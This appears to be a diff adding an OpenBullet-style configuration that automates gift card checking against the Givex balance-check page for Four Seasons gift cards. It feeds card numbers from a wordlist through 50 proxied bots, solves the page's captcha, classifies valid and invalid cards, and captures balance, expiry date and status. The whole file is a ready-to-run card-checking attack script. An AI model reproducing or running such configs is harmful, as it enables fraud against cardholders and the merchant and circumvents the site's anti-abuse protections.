@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "4seasonsGC",
+  "SuggestedBots": 50,
+  "LastModified": "2018-07-31T19:48:05.4588628+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "Cards",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://wwws-canada2.givex.com/cws/fourseasons/consumer/clp/balance_check.py?start:true" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#COOKIE PARSE "<COOKIES(cws_webinfo_id)>" LR "" "" Recursive=FALSE -> VAR "COOKIE" "" "" 
+PARSE "<SOURCE>" LR "src=\"/public/balance/securebmp.py?" "\">" Recursive=FALSE -> VAR "PARSE" "" "" 
+CAPTCHA "https://wwws-canada2.givex.com/public/balance/securebmp.py?<PARSE>" Base64=FALSE SendScreenshot=FALSE -> VAR "CAPTCHA" 
+REQUEST POST "https://wwws-canada2.givex.com/cws/fourseasons/consumer/clp/balance_check.py" AutoRedirect=TRUE 
+  CONTENT "_FUNCTION_=balance&cardnum=<USER>&code=<CAPTCHA>&balance_check=Check+Balance&form_submit=t" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://wwws-canada2.givex.com/cws/fourseasons/consumer/clp/balance_check.py?start:true" 
+  HEADER "Origin: https://wwws-canada2.givex.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Invalid" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid card" 
+  KEYCHAIN Retry OR 
+    KEY "Invalid code" 
+#PARSE_$ PARSE "<SOURCE>" LR "Current Dollar Balance</td><td class=\"structured-list-value\">" "." Recursive=FALSE -> CAP "BALANCE" "" "" 
+#PARSE_exp PARSE "<SOURCE>" LR "Expiry Date</td><td class=\"structured-list-value\">" "<" Recursive=FALSE -> CAP "EXPIRY DATE" "" "" 
+#PARSE_status PARSE "<SOURCE>" LR "Status</td><td class=\"structured-list-value\">" "<" Recursive=FALSE -> CAP "STATUS" "" "" 
